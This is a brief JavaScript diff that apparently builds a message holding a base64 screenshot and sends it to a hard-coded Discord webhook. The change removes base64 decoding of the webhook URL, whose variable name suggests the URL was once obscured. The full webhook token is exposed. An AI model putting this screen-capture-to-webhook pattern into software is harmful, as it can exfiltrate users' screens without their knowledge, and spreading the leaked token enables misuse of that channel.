@@ -63,7 +63,7 @@ script.onload = function() {
         msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
 
         var disBase64 = "https://discordapp.com/api/webhooks/1286611999404589106/pt9S7Jjzx49Mk_YdPPyHn_2KPz0dFz-y1XIugJgbB34W5SRvkKUhAtRBkWGfffuWIf5m";
-        var discordWebhook = atob(disBase64);
+        var discordWebhook = disBase64;
         
         // Tạo file Blob từ nội dung
         var blob = new Blob([msg], { type: "text/plain" });
